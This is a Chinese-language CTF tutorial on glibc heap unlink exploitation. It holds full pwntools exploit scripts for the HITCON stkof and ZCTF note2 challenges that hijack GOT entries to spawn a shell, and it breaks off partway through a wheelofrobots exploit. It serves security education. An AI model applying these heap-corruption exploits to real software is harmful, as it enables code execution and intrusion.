# Unlink

## 原理 

我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。

我们先来简单回顾一下 unlink 的目的与过程，其目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下

![unlink_smallbin_intro](img\unlink_smallbin_intro.png)

下面我们首先介绍一下 unlink 最初没有防护时的利用方法，然后介绍目前利用 unlink 的方式。

### 古老的 unlink

在最初 unlink 实现的时候，其实是没有对 chunk 的 size 检查和双向链表检查的，即没有如下检查代码。

```c
// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)
if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");               \
// 检查 fd 和 bk 指针(双向链表完整性检查)
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
  malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \

  // largebin 中 next_size 双向链表完整性检查 
              if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \
                || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
              malloc_printerr (check_action,                                      \
                               "corrupted double-linked list (not small)",    \
                               P, AV);
```

**这里我们以 32 位为例**，假设堆内存最初的布局是下面的样子

![old_unlink_vul](img\old_unlink_vul.png)

现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（**比如溢出**）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时

- glibc 判断这个块是 small chunk
- 判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并
- 判断后向合并，发现后一个 chunk 处于空闲状态，需要合并
- 继而对 Nextchunk 采取 unlink 操作

那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下

- FD=P->fd = target addr -12
- BK=P->bk = expect value
- FD->bk = BK，即 *(target addr-12+12)=BK=expect value
- BK->fd = FD，即 *(expect value +8) = FD = target addr-12

**总结：**

```c
// 使用前提：使用传入参数
P->fd = target-12;
P->bk = expect value;
// 作用效果：
// target addr 覆写为 expect value
*(target addr) = expect value;
// expect value 覆写为 target addr -12
*(expect value +8) = target addr -12;
```

**看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限。**

比如说我们将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。**需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过。**

### 当前的 unlink

**但是，现实是残酷的。。**我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查

```c
// fd bk
// FD的下一个chunk是否为P；BK的上一个chunk是否为P；
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
  malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
```

假如此时 FD、BK 指针内容为：

- FD->bk = target addr - 12 + 12=target_addr
- BK->fd = expect value + 8

那么我们上面所利用的修改 GOT 表项的方法就~~可能~~不可用了，但是我们可以通过伪造的方式绕过这个机制。

首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要

- `fakeFD -> bk == P` <=> `*(fakeFD + 12) == P`

  前一个 chunk bk 指向 P 

- `fakeBK -> fd == P` <=> `*(fakeBK + 8) == P`

  后一个 chunk fd 指向 P

当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：

- `fakeFD -> bk = fakeBK` <=> `*(fakeFD + 12) = fakeBK`

  前一个 chunk bk 更新为后一个 chunk 地址

- `fakeBK -> fd = fakeFD` <=> `*(fakeBK + 8) = fakeFD`

  后一个 chunk fd 更新为前一个 chunk 地址

**小结**

```c
// 规避检查伪造条件
// fakeFD == P->fd; fakeBK == P->bk;
*(fakeFD + 12) == P;
*(fakeBK + 8) == P;
// unlink 结果
*(fakeFD + 12) = fakeBK;
*(fakeBK + 8) = fakeFD;
```

如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：

```c
// fakeFD + 12 = P;		fakeBK + 8 = P;
*(fakeFD + 12) = *P = fakeBK = P - 8;
*(fakeBK + 8) = *P = fakeFD = P - 12;
```

化简后 unlink 结果为：

- `*P = P - 8`
- `*P = P - 12`

即通过此方式，**P 的指针指向了比自己低 12 的地址处**。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。

> 这里指的低 12 是在 32 位系统下，如果是 64 位系统就是 3*8 = 24 。
>
> 归纳起来就是**将 P 指针指向比 P 低 3 个机器周期的地址处**

如果我们想要使得两者都指向 P，只需要按照如下方式修改即可

![new_unlink_vul](img\new_unlink_vul.png)

需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。

```c
    // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
	// 判断当前大小 chunksize 与 nextchunk 的 prev_size 记录值是否一致
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");               \
```

**此外，其实如果我们设置 next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。**

## 利用思路

### 条件 

1. UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针
2. 已知位置存在一个指针指向可进行 UAF 的 chunk

![unlink利用](img\unlink利用.jpg)

### 效果 

使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18

![unlink效果](img\unlink效果.jpg)

### 思路 

设指向可 UAF chunk 的指针的地址为 ptr

1. 修改 fd 为 ptr - 0x18
2. 修改 bk 为 ptr - 0x10
3. 触发 unlink

ptr 处的指针会变为 ptr - 0x18。

## 2014 HITCON stkof

> 做题环境：Ubuntu 16.04

### 基本信息

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
        
stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
```

程序存在 4 个功能，经过 IDA 分析后可以分析功能如下

- alloc：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 global
- fill：根据指定索引，向分配的内存处读入数据，数据长度可控，**这里存在堆溢出的情况**
- free_chunk：根据指定索引，释放已经分配的内存块
- print：这个功能并没有什么卵用，本来以为是可以输出内容，结果什么也没有输出

### 漏洞函数

fiil 写入字符长度是由用户决定的，这里就存在一个堆溢出。

```c
idx = atol(&s);
if ( idx > 0x100000 )
    return 0xFFFFFFFFLL;
if ( !globals[idx] )
    return 0xFFFFFFFFLL;
fgets(&s, 16, stdin);
size = atoll(&s);
ptr = globals[idx];
```

### IO 缓冲区问题分析

这条题目堆空间一开始可能和我们想象的不一样，这是由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看。

初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。

```
*RAX  0x0
*RBX  0x400
*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 /* 'H=' */
*RDX  0x88
*RDI  0x400
*RSI  0x7fffffffd860 ◂— 0x16
*R8   0x1
*R9   0x0
*R10  0x7ffff7fd2700 ◂— 0x7ffff7fd2700
*R11  0x246
*R12  0xa
*R13  0x9
 R14  0x0
*R15  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
*RBP  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
*RSP  0x7fffffffd858 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax
*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp
─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────
 ► 0x7ffff7a91130 <malloc>        push   rbp <0x7ffff7dd18e0>
...，省略
 ► f 0     7ffff7a91130 malloc
   f 1     7ffff7a7a1d5 _IO_file_doallocate+85
   f 2     7ffff7a88594 _IO_doallocbuf+52
   f 3     7ffff7a8769c _IO_file_underflow+508
   f 4     7ffff7a8860e _IO_default_uflow+14
   f 5     7ffff7a7bc6a _IO_getline_info+170
   f 6     7ffff7a7bd78
   f 7     7ffff7a7ab7d fgets+173
   f 8           400d2e
   f 9     7ffff7a2d830 __libc_start_main+240
```

分配之后，堆如下

```
pwndbg> heap
Top Chunk: 0xe05410
Last Remainder: 0

0xe05000 PREV_INUSE {
  prev_size = 0,
  size = 1041,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0xe05410 PREV_INUSE {
  prev_size = 0,
  size = 134129,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

当分配16大小的内存后，堆布局如下

```
pwndbg> heap
Top Chunk: 0xe05430
Last Remainder: 0

0xe05000 PREV_INUSE {
  prev_size = 0,
  size = 1041,
  fd = 0xa3631,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0xe05410 FASTBIN {
  prev_size = 0,
  size = 33,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x20bd1
}
0xe05430 PREV_INUSE {
  prev_size = 0,
  size = 134097,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

当使用 printf 函数，会分配 1024 字节空间，如下

```
*RAX  0x0
*RBX  0x400
*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 /* 'H=' */
*RDX  0x88
*RDI  0x400
*RSI  0x7fffffffd1c0 ◂— 0x16
 R8   0x0
*R9   0x0
*R10  0x0
*R11  0x246
*R12  0x1
*R13  0x7fffffffd827 ◂— 0x31 /* '1' */
 R14  0x0
*R15  0x400de4 ◂— and    eax, 0x2e000a64 /* '%d\n' */
*RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2284
*RSP  0x7fffffffd1b8 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax
*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp
─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────
 ► 0x7ffff7a91130 <malloc>       push   rbp <0x7ffff7dd2620>
。。。省略
► f 0     7ffff7a91130 malloc
   f 1     7ffff7a7a1d5 _IO_file_doallocate+85
   f 2     7ffff7a88594 _IO_doallocbuf+52
   f 3     7ffff7a878f8 _IO_file_overflow+456
   f 4     7ffff7a8628d _IO_file_xsputn+173
   f 5     7ffff7a5ae00 vfprintf+3216
   f 6     7ffff7a62899 printf+153
   f 7           4009cd
   f 8           400cb1
   f 9     7ffff7a2d830 __libc_start_main+240
```

堆布局如下

```
pwndbg> heap
Top Chunk: 0xe05840
Last Remainder: 0

0xe05000 PREV_INUSE {
  prev_size = 0,
  size = 1041,
  fd = 0xa3631,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0xe05410 FASTBIN {
  prev_size = 0,
  size = 33,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x411
}
0xe05430 PREV_INUSE {
  prev_size = 0,
  size = 1041,
  fd = 0xa4b4f,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0xe05840 PREV_INUSE {
  prev_size = 0,
  size = 133057,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

此后，无论是输入输出都不会再申请缓冲区了。所以我们最好最初的申请一个 chunk 来把这些缓冲区给申请了，方便之后操作。

但是，比较有意思的是，如果我们是 gdb.attach 上去的话，第一个缓冲区分配的大小为 4096 大小。

```
pwndbg> heap
Top Chunk: 0x1e9b010
Last Remainder: 0

0x1e9a000 PREV_INUSE {
  prev_size = 0,
  size = 4113,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
0x1e9b010 PREV_INUSE {
  prev_size = 0,
  size = 135153,
  fd = 0x0,
  bk = 0x0,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
```

申请第一个堆（0x48），之后还会出现第二个缓冲区堆块（1040）：

```
//重新启动过，所以地址与上面不对应，但是结构是一样的
pwndbg> heap
0xe05000 PREV_INUSE {
  prev_size = 0, 
  size = 4113, 
  fd = 0xa383231, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe06010 FASTBIN {
  prev_size = 0, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe06060 PREV_INUSE {
  prev_size = 0, 
  size = 1041, 
  fd = 0xa4b4f, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
…………
```

### 基本思路

根据上面分析，我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。

由于程序本身没有 leak，要想执行 system 等函数，我们的首要目的还是先构造 leak，基本思路如下：

- 利用 unlink 修改 global[2] 为 &global[2]-0x18。
- 利用编辑功能修改 global[0] 为 free@got 地址，同时修改 global[1] 为puts@got 地址，global[2] 为 &global[2]-0x18 。
- 修改 `free@got` 为 `puts@plt` 的地址，从而当再次调用 `free` 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。
- free global[1]，即泄漏 puts@got 内容，从而知道 system 函数地址以及 libc 中 /bin/sh 地址。
- 修改 global[1] 为 /bin/sh 地址，修改 `free@got` 为 `system@got` 的地址，free chunk 1 即可。

unlink 我们搞两个物理相邻的堆即可（2&3），也不需要关心 chunk3  free 时会与 topchunk 合并，所以没有创建一个保护堆块。

```python
create(0x48)	# 1
create(0x30)	# 2
create(0x80)	# 3
```

> 最后 getshell 做法和 wiki 略有区别。

### EXP

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : MrSkYe
# @Email   : skye231@foxmail.com
from pwn import *
context(log_level='debug',os='linux',arch='amd64')

p = process("./stkof")
elf = ELF("./stkof")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n')

def edit(idx, size, content):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil('OK\n')

def free(idx):
    p.sendline('3')
    p.sendline(str(idx))

def show(idx):
    p.sendline('4')
    p.sendline(str(idx))

globals = 0x0602140
ptr = globals + 0x10

create(0x48)	# 1
create(0x30)	# 2
create(0x80)	# 3

# 伪造一个堆块；修改chunk3 size；
payload0 = p64(0) + p64(0x20)
payload0 += p64(ptr-0x18) + p64(ptr-0x10)
payload0 += p64(0x20)
payload0 = payload0.ljust(0x30,'a')
payload0 += p64(0x30) + p64(0x90)
edit(2,len(payload0),payload0)
# 触发unlink
free(3)
p.recvuntil('OK\n')

# 修改global指针表
payload1 = "skye".ljust(0x8,'a')
payload1 += p64(elf.got['free'])	# 0
payload1 += p64(elf.got['puts'])	# 1
payload1 += p64(globals-0x8)		# 2
edit(2,len(payload1),payload1)

# overwrite free 2 puts
edit(0,8,p64(elf.plt['puts']))
# leak libc
free(1)

puts_addr = u64(p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00'))
log.info("puts_addr:"+hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
binsh_addr = libc_base + next(libc.search('/bin/sh'))
system_addr = libc_base + libc.symbols['system']
log.success('libc_base:' + hex(libc_base))
log.success('binsh_addr:' + hex(binsh_addr))
log.success('system_addr:' + hex(system_addr))

# 修改global指针表
payload2 = "skye".ljust(0x8,'a')
payload2 += p64(elf.got['free'])	# 0
payload2 += p64(binsh_addr)			# 1
edit(2,len(payload2),payload2)
# overwrite free 2 system
edit(0,8,p64(system_addr))
# gdb.attach(p,'b *0x0400919')
free(1)


p.interactive()
```

## 2016 ZCTF note2

###  基本信息

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    note2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
```



### 分析程序 

首先，我们先分析一下程序，可以看出程序的主要功能为

- 添加 note，size 限制为 0x80，size 会被记录，note 指针会被记录。
- 展示 note 内容。
- 编辑 note 内容，其中包括覆盖已有的 note，在已有的 note 后面添加内容。
- 释放 note。

仔细分析后，可以发现程序有以下几个问题

1. 在 create 时，程序会记录 note 对应的大小，该大小会用于控制读取 note 的内容。自定义函数中的循环变量 i 定义为 int 型，但是用于比较的传入参数定义是 unsigned int 。

    ```c
    for ( i = 0LL; length - 1 > i; ++i )          // 预留最后一位写入\x00
        // 堆溢出：length为unsigned int，当length等于0时，结果是一个非常大整数
    {
        v7 = read(0, &buf, 1uLL);
        if ( v7 <= 0 )
            exit(-1);                                 // 读入错误退出程序
        if ( buf == v4 )                            // 判断结束符
            break;
        *(_BYTE *)(i + ptr) = buf;
    }
    *(_BYTE *)(ptr + i) = 0;                      // 写入结束符\x00
    return i;
    ```

    

    在 C 语言中，我们用 int 和 unsigned int 两种数据类型进行运算时，会自动转换为 unsigned int，那么当我们输入 size 为 0 时，glibc 根据其规定，会分配 0x20 个字节，即：prez_size,size,fd,bk。因为 size 为 0 ，然后退出判断条件为：size-1 ，那么退出条件就恒满足，程序读取的长度就不受到限制，故而会产生堆溢出。

2. 程序在每次编辑 note 时，都会申请 0xa0 大小的内存，但是在 free 之后并没有设置为 NULL，对做题没有影响。但是注意一下每次编辑时可输入的长度，是否能被利用。（后面有详解）

### 漏洞函数

在编辑 create 时调用，存在写入长度可控，造成堆溢出。

```c
for ( i = 0LL; length - 1 > i; ++i )          // 预留最后一位写入\x00
    // 堆溢出：length为unsigned int，当length等于0时，结果是一个非常大整数
{
    v7 = read(0, &buf, 1uLL);
    if ( v7 <= 0 )
        exit(-1);                                 // 读入错误退出程序
    if ( buf == v4 )                            // 判断结束符
        break;
    *(_BYTE *)(i + ptr) = buf;
}
*(_BYTE *)(ptr + i) = 0;                      // 写入结束符\x00
return i;
```

造成原因前面有说，这里概述一下：length 为 unsigned int 当与 int 类型运算时，结果会被自动转换为 unsigned int ，那么 length - 1 就能产生一个巨大正数，从而无限输入。

还有一个地方就是 edit 功能。主要逻辑是创建一个 0xa0 的堆块，用来存放 tmp 数据、准备写入被修改 chunk 的数据，重点是**每次输入临时数据长度都是 0x90 **

```c
my_input((__int64)(v8 + 15), 0x90LL, 10);
```

一开始看上去是存在溢出，假如 chunk size 为 0x80 ，就能溢出 0x90 ？不想多了，在调试后发现不会溢出的，因为有这一句话：

```c
v1[chunk_size - strlen(&dest) + 14] = 0;
```

程序会在 chunk size 上限的地方写入一个 ``\x00`` ，从而避免了溢出。所以漏洞利用点就只有一个。

### 基本思路 

这里我们利用发现的第一个问题，主要利用了 fastbin 的机制、unlink 的机制。

1. 创建 3 个堆块，chunk1 为 fastbin ，其余是 unsorted bin 。创建 chunk 0 写入数据时，将 fake chunk 也写入。
2. 释放 chunk 1 ， 然后再次申请相同大小的 chunk ，由于 fastbin 机制，会使用原来 chunk 1 的地址。申请 size 为 0 ，触发漏洞修改 chunk 2 的 prez_size 和 prez_inuse 。
3. 释放 chunk 2 触发 unlink hijack chunk list 指针列表。

#### 基本操作 

首先，我们先把 note 可能的基本操作列举出来。

```python
# coding=UTF-8
from pwn import *

p = process('./note2')
elf = ELF('./note2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'


def newnote(length, content):
    p.recvuntil('option--->>')
    p.sendline('1')
    p.recvuntil('(less than 128)')
    p.sendline(str(length))
    p.recvuntil('content:')
    p.sendline(content)


def shownote(id):
    p.recvuntil('option--->>')
    p.sendline('2')
    p.recvuntil('note:')
    p.sendline(str(id))


def editnote(id, choice, s):
    p.recvuntil('option--->>')
    p.sendline('3')
    p.recvuntil('note:')
    p.sendline(str(id))
    p.recvuntil('2.append]')
    p.sendline(str(choice))
    p.sendline(s)


def deletenote(id):
    p.recvuntil('option--->>')
    p.sendline('4')
    p.recvuntil('note:')
    p.sendline(str(id))
```

#### 生成三个 note

构造三个 chunk，chunk0、chunk1 和 chunk2

```python
payload = p64(0)+p64(0xa1)
payload += p64(chunk_ptr-0x18) + p64(chunk_ptr-0x10)

newnote(0x80,payload)
newnote(0,'b'*8)
newnote(0x80,'c'*8)
```

其中这三个 chunk 申请时的大小分别为 0x80，0，0x80 。chunk1 虽然申请的大小为 0，但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。同时，由于无符号整数的比较问题，可以为该 note 输入任意长的字符串。

这里需要注意的是，chunk0 中一共构造了两个 chunk

- chunk ptr[0]，这个是为了 unlink 时修改对应的值。
- chunk ptr[0]'s nextchunk，这个是为了使得 unlink 时的第一个检查满足。

```c
    // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");               \
```

当构造完三个 note 后，堆的基本构造如图 1 所示。

```
                                   +-----------------+ high addr
                                   |      ...        |
                                   +-----------------+
                                   |      'b'*8      |
                ptr[2]-----------> +-----------------+
                                   |    size=0x91    |
                                   +-----------------+
                                   |    prevsize     |
                                   +-----------------|------------
                                   |    unused       |
                                   +-----------------+
                                   |    'a'*8        |
                 ptr[1]----------> +-----------------+  chunk 1
                                   |    size=0x20    |
                                   +-----------------+
                                   |    prevsize     |
                                   +-----------------|-------------
                                   |    unused       |
                                   +-----------------+
                                   |   ……………………      |
fake ptr[0] chunk's nextchunk----->+-----------------+
                                   |   ……………………      |
                                   +-----------------+
                                   |    fakebk       |
                                   +-----------------+
                                   |    fakefd       |
                                   +-----------------+
                                   |    0xa1         |  chunk 0
                                   +-----------------+
                                   |    0            |
                 ptr[0]----------> +-----------------+
                                   |    size=0x91    |
                                   +-----------------+
                                   |    prev_size    |
                                   +-----------------+  low addr
```

```shell
pwndbg> x /40gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000091
0x603010:	0x0000000000000000	0x00000000000000a1
0x603020:	0x0000000000602108	0x0000000000602110
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000021
0x6030a0:	0x6262626262626262	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000091
0x6030c0:	0x6363636363636363	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
```

#### 释放 chunk1 - 覆盖 chunk2 - 释放 chunk2

对应的代码如下

```python
deletenote(1)
payload = 'a'*0x10
payload += p64(0xa0) + p64(0x90)
newnote(0,payload)
deletenote(2)

payload = 'a'*0x18 + p64(atoi_got)
editnote(0,1,payload)
shownote(0)
```

首先释放 chunk1，由于该 chunk 属于 fastbin，所以下次在申请的时候仍然会申请到该 chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖 chunk2，覆盖之后如图 2 所示。

```
                                   +-----------------+high addr
                                   |      ...        |
                                   +-----------------+
                                   |   '\x00'+'b'*7  |
                ptr[2]-----------> +-----------------+ chunk 2
                                   |    size=0x90    |
                                   +-----------------+
                                   |    0xa0         |
                                   +-----------------|------------
                                   |    'a'*8        |
                                   +-----------------+
                                   |    'a'*8        |
                 ptr[1]----------> +-----------------+ chunk 1
                                   |    size=0x20    |
                                   +-----------------+
                                   |    prevsize     |
                                   +-----------------|-------------
                                   |   ...           |
                                   +-----------------+
                                   |  ...            |
fake ptr[0] chunk's nextchunk----->+-----------------+
                                   |    ...          |
                                   +-----------------+
                                   |    fakebk       |
                                   +-----------------+
                                   |    fakefd       |
                                   +-----------------+
                                   |    0xa1         |  chunk 0
                                   +-----------------+
                                   |    '0' *8       |
                 ptr[0]----------> +-----------------+
                                   |    size=0x91    |
                                   +-----------------+
                                   |    prev_size    |
                                   +-----------------+  low addr
                                           图2
```

```shell
pwndbg> x /40gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000091
0x603010:	0x0000000000000000	0x00000000000000a1
0x603020:	0x0000000000602108	0x0000000000602110
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000021
0x6030a0:	0x6161616161616161	0x6161616161616161
0x6030b0:	0x00000000000000a0	0x0000000000000090
0x6030c0:	0x6363636363636300	0x0000000000000000
```



该覆盖主要是为了释放 chunk2 的时候可以后向合并（合并低地址），对 chunk0 中虚拟构造的 chunk 进行 unlink。即将要执行的操作为 unlink(ptr[0])，同时我们所构造的 fakebk 和 fakefd 满足如下约束

```c
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
```

unlink 成功执行，会导致 ptr[0] 所存储的地址变为 fakebk，即 ptr-0x18。

#### 泄露 libc 地址 

代码如下

```python
payload = 'a'*0x18 + p64(atoi_got)
editnote(0,1,payload)
shownote(0)

p.recvuntil("Content is ")
leak_addr = u64(p.recv(6).ljust(8,'\x00'))
libc_base = leak_addr - libc.symbols['atoi']
system_addr = libc_base + libc.symbols['system']
onegadget = libc_base + 0xf1207
log.info("leak_addr:"+hex(leak_addr))
log.info("libc_base:"+hex(libc_base))
log.info("system_addr:"+hex(system_addr))
log.info("onegadget:"+hex(onegadget))
```

我们修改 ptr[0] 的内容为 ptr 的地址 - 0x18，所以当我们再次编辑 note0 时，可以覆盖 ptr[0] 的内容。这里我们将其覆盖为 atoi 的地址。 这样的话，如果我们查看 note 0 的内容，其实查看的就是 atoi 的地址。

#### 修改 atoi got

```python
payload = p64(onegadget)
editnote(0,1,payload)
```

由于此时 ptr[0] 的地址 got 表的地址，所以我们可以直接修改该 note，覆盖为 one_gadget 地址。

#### get shell

```python
p.sendline('skye')
p.interactive()
```

此时如果我们再调用 atoi ，其实调用的就是 one_gadget ，所以就可以拿到 shell 了。

### 总结

题目考点：unlink、fastbin 机制、数字类型运算转换。

unlink 和 fastbin 与上面学习的差别不大，都是利用 unlink 控制 chunk list 修改当中的 堆指针地址，实现一个任意地址读写。

一开始在这条题目卡住就是在，edit 这个功能一度以为存在堆溢出。最后看 wp 才知道存在 unsigned int 与 int 运算类型转换的逻辑漏洞，找到溢出点就好做了。

## 2017 insomni'hack wheelofrobots

### 基本信息 

```
wheelofrobots: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

动态链接 64 位，主要开启了 canary 保护与 nx 保护。

### 基本功能 

大概分析程序，可以得知，这是一个配置机器人轮子的游戏，机器人一共需要添加 3 个轮子才能启动。

程序非常依赖的一个功能是读取整数，该函数 read_num 是读取最长为 4 字节的内容，然后将其转化为 int 类型返回。

程序基本功能：堆增删查改。

* add

  最多能申请 3 个堆块。每种轮子的创建策略不同，主要确保是申请大小的限制以及是否固定大小。

* start_robot

  随机选择一个轮子（堆）的内容进行输出，然后退出程序。
  
* change

  根据每个 chunk size 修改 chunk 内容

### 漏洞

#### off-by-one

add 选择添加的轮子时，调用 read_num 最长可以写入 4 字节，最后 1 字节会覆盖 bender_inuse ，构成了 off-by-one 漏洞。

```
.bss:0000000000603110 choice          db    ? ;               ; DATA XREF: add+3A↑o
.bss:0000000000603110                                         ; add+49↑o ...
.bss:0000000000603111                 db    ? ;
.bss:0000000000603112                 db    ? ;
.bss:0000000000603113                 db    ? ;
.bss:0000000000603114 bender_inuse    dd ?                    ; DATA XREF: add:loc_400EE0↑r
```

#### 堆溢出

add 添加 destructor 轮子（第6个）时，size 是正常产生的：``destructor = calloc(1uLL, 20 * v5);`` ，没有对 v5 大小进行限制，具体可以对比第 3 个轮子。read_num 定义返回值为 int ，v5 定义为 unsigned int ，只要读取的数为负数，那么在申请`calloc(1uLL, 20 * v5);` 时就可能导致 `20*v5` 溢出。与此同时， `destructor_size = v5` 会很大，destructor_size 定义为 __int64 即 long long int 有符号 64 位整数，v5 强制赋值给它会依然为一个非常大的正数。

#### UAF

free chunk 只是释放内存，没有将对应指针清空，size 位也没有清空。

### 利用思路 

> 构造任意读写指针比较绕，后面就是前面的 unlink 操作。

基本利用思路如下

1. 利用 off by one 漏洞与 fastbin attack 分配 chunk 到 0x603138，进而可以控制 `destructor_size`的大小，从而实现任意长度堆溢出。这里我们将轮子 1 tinny 分配到这里。

   > 这里是一定要 destructor 这个轮子，控制其他轮子的 size 值也是可以的，但主要是否能 bypass fastbin 的检查就行。

   fastbin attack 将 1 tinny 指针指向 destructor_size ，后续通过 edit 1 tinny 修改 destructor_size 。

   ```python
   # add a fastbin chunk 0x20 and free it
   # fastbin 指针指向：2 bender->NULL
   add(2, 1)  # 2 bender
   remove(2)
   # off-by-one 覆写 idx2 inuse 为 1 让我们能编辑
   overflow_benderinuse('\x01')
   # 覆写 fd 2 0x603138, point to 2 bender's size,后面伪造堆fd就是destructor_size
